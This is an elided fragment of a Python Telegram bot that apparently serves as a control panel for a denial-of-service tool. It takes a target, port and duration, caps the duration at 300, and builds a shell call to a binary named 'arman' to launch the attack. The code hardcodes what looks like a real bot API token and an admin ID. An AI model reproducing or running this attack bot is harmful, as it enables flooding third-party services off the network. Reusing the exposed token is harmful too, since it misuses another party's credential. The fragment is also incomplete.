...
API_TOKEN = '8138743637:AAEWr5Lf1Yy06tKDn76u6GKAZdB_LKtimvc'  # Replace with your bot's API token
bot = telebot.TeleBot(API_TOKEN)

admin_id = "7933339379"
admin_id = ["7933339379"]
admin_ids = ["7933339379"]
owner_id = "7933339379"
...
# State tracking for "FUCK" button
user_attack_state = {}
        ...
        if len(command) == 3:
            try:
                ...
                if time > 300:
                    ...
                    bot.send_message(message.chat.id, response)
                    full_command = f"./arman {target} {port} {time} 1000"
